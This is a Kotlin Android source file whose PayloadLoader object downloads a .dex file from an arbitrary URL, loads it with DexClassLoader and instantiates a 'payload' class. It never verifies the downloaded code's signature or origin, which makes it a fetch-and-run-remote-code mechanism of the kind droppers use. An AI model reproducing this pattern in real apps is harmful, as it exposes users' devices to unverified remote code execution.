package com.speedster

import android.content.Context
import dalvik.system.DexClassLoader
import java.io.File

object PayloadLoader {
    private const val PAYLOAD_CLASS = "com.speedster.payload.PayloadEntry"
    
    fun loadPayload(context: Context, dexFile: File): DynamicEntry? {
        return try {
            val internalDex = File(context.codeCacheDir, "payload.dex")
            dexFile.copyTo(internalDex, overwrite = true)
            
            val classLoader = DexClassLoader(
                internalDex.absolutePath,
                context.codeCacheDir.absolutePath,
                null,
                context.classLoader
            )
            
            val clazz = classLoader.loadClass(PAYLOAD_CLASS)
            clazz.getDeclaredConstructor().newInstance() as? DynamicEntry
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }

    fun downloadAndLoad(context: Context, url: String, onComplete: (DynamicEntry?) -> Unit) {
        Thread {
            try {
                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                val input = connection.inputStream
                val tempFile = File(context.cacheDir, "downloaded.dex")
                tempFile.outputStream().use { input.copyTo(it) }
                
                val loaded = loadPayload(context, tempFile)
                // Move back to main thread for UI update
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    onComplete(loaded)
                }
            } catch (e: Exception) {
                e.printStackTrace()
                android.os.Handler(android.os.Looper.getMainLooper()).post { onComplete(null) }
            }
        }.start()
    }

    fun clearPayload(context: Context) {
        File(context.codeCacheDir, "payload.dex").delete()
        val prefs = context.getSharedPreferences("speedster_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean("has_payload", false).apply()
    }

    fun loadExistingPayload(context: Context): DynamicEntry? {
        val internalDex = File(context.codeCacheDir, "payload.dex")
        if (!internalDex.exists()) return null
        
        return try {
            val classLoader = DexClassLoader(
                internalDex.absolutePath,
                context.codeCacheDir.absolutePath,
                null,
                context.classLoader
            )
            val clazz = classLoader.loadClass(PAYLOAD_CLASS)
            clazz.getDeclaredConstructor().newInstance() as? DynamicEntry
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }
}